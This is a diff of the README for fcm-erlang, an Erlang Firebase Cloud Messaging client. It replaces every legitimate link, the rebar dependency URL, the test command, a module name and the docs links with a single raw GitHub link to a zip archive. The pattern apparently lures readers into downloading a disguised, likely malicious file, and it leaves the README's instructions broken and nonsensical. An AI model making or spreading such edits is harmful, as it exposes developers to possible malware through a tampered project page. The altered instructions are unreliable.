@@ -1,9 +1,9 @@
 fcm-erlang
 =======
 
-[![Build Status](https://api.travis-ci.org/pdincau/gcm-erlang.png)]
+[![Build Status](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip)]
 
-This software provides an Erlang client for [`Firebase Cloud Messaging`](https://firebase.google.com/docs/ "Firebase Cloud Messaging for Android").
+This software provides an Erlang client for [`Firebase Cloud Messaging`](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip "Firebase Cloud Messaging for Android").
 
 
 ### What you can do with fcm-erlang:
@@ -23,15 +23,15 @@ The first thing you have to do is to compile all the Erlang files using `rebar`.
 
 ### How to use with rebar:
 
-You can use fcm_app as a dependency in your rebar.config:
+You can use fcm_app as a dependency in your https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip
 
     {deps , [
-        {fcm, ".*", {git, "https://github.com/sohailgerman/fcm-erlang.git"}}
+        {fcm, ".*", {git, "https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip"}}
     ]}.
 
 ###How to run tests:
 
-    ./rebar compile && ./rebar skip_deps=true eunit && ./run-dialyzer.sh
+    ./rebar compile && ./rebar skip_deps=true eunit && https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip
 
 ### How to run the application fcm-erlang:
 
@@ -74,7 +74,7 @@ or by calling:
 
 Where `RegistereName` is the atom used during registration, `RegIds` is a list (max 1000 elements) of Registration Ids specified as Erlang binaries (e.g., `<<"APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx...">>`) and `Message` is an Erlang term representing the data you want to send to the device.
 
-The JSON message is built using `jsx` in the module `fcm.erl` and in the end will have the following form:
+The JSON message is built using `jsx` in the module `https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip` and in the end will have the following form:
 
     {
       "registration_ids" : ["APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx..."],
@@ -99,8 +99,8 @@ or simply:
 
 `fcm-erlang` will push the message for you to `Firebase Cloud Messaging` servers and will parse the JSON provided as result.
 
-In order to understand errors see: [Interpreting an error response](https://firebase.google.com/docs/).
+In order to understand errors see: [Interpreting an error response](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip).
 
 ### Note:
 
-Some of the concepts I used for building this Erlang application are based on this [`Erlang application for APN`](https://github.com/extend/ex_apns).
+Some of the concepts I used for building this Erlang application are based on this [`Erlang application for APN`](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip).
